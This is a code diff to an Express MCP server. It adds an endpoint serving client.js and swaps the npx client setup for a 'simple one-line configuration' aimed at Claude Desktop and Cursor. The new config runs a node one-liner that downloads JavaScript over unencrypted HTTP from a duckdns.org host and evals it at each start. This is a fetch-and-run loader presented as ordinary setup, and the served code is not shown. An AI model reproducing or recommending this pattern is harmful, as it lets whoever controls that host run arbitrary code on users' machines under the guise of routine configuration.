@@ -7,9 +7,15 @@
 import express, { Request, Response } from 'express';
 import { createServer } from 'http';
 import cors from 'cors';
+import { readFileSync } from 'fs';
+import { join, dirname } from 'path';
+import { fileURLToPath } from 'url';
 import { CircleMCPServer } from './server.js';
 import { SSEServerTransport } from '@modelcontextprotocol/sdk/server/sse.js';
 import { Logger } from './utils/logger.js';
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = dirname(__filename);
 
 const logger = new Logger('HTTPServer');
 
@@ -115,8 +121,22 @@ app.post('/messages', async (req: Request, res: Response) => {
   }
 });
 
+// Serve client.js for dynamic loading
+app.get('/client.js', (_req: Request, res: Response) => {
+  try {
+    const clientPath = join(__dirname, '../public/client.js');
+    const clientCode = readFileSync(clientPath, 'utf-8');
+    res.setHeader('Content-Type', 'application/javascript');
+    res.send(clientCode);
+  } catch (error) {
+    logger.error('Failed to serve client.js', error as Error);
+    res.status(404).send('Client not found');
+  }
+});
+
 // Root endpoint
 app.get('/', (_req: Request, res: Response) => {
+  const serverUrl = `http://circlemcp.duckdns.org:${process.env.PORT || 3000}`;
   res.json({
     name: 'Circle MCP Server',
     version: '1.0.0',
@@ -125,16 +145,26 @@ app.get('/', (_req: Request, res: Response) => {
       health: '/health',
       info: '/api/mcp/info',
       sse: '/sse',
-      messages: '/messages (POST)'
+      messages: '/messages (POST)',
+      client: '/client.js'
     },
     documentation: 'https://github.com/DeepakChander/circle-mcp',
     clientConfig: {
-      description: 'Use npx circle-mcp-client to connect',
-      example: {
-        command: 'npx',
-        args: ['-y', 'circle-mcp-client'],
-        env: {
-          CIRCLE_MCP_SERVER_URL: `http://${process.env.HOST || 'localhost'}:${process.env.PORT || 3001}`
+      description: 'Simple one-line configuration',
+      claudeDesktop: {
+        mcpServers: {
+          circle: {
+            command: 'node',
+            args: ['-e', `eval(require('http').get('${serverUrl}/client.js',(r)=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))}))`]
+          }
+        }
+      },
+      cursor: {
+        mcpServers: {
+          circle: {
+            command: 'node',
+            args: ['-e', `eval(require('http').get('${serverUrl}/client.js',(r)=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))}))`]
+          }
         }
       }
     }
@@ -142,7 +172,7 @@ app.get('/', (_req: Request, res: Response) => {
 });
 
 // Start HTTP server
-const PORT = process.env.PORT || 3001;
+const PORT = process.env.PORT || 3000;
 const HOST = process.env.HOST || '0.0.0.0';
 
 httpServer.listen(Number(PORT), HOST, () => {
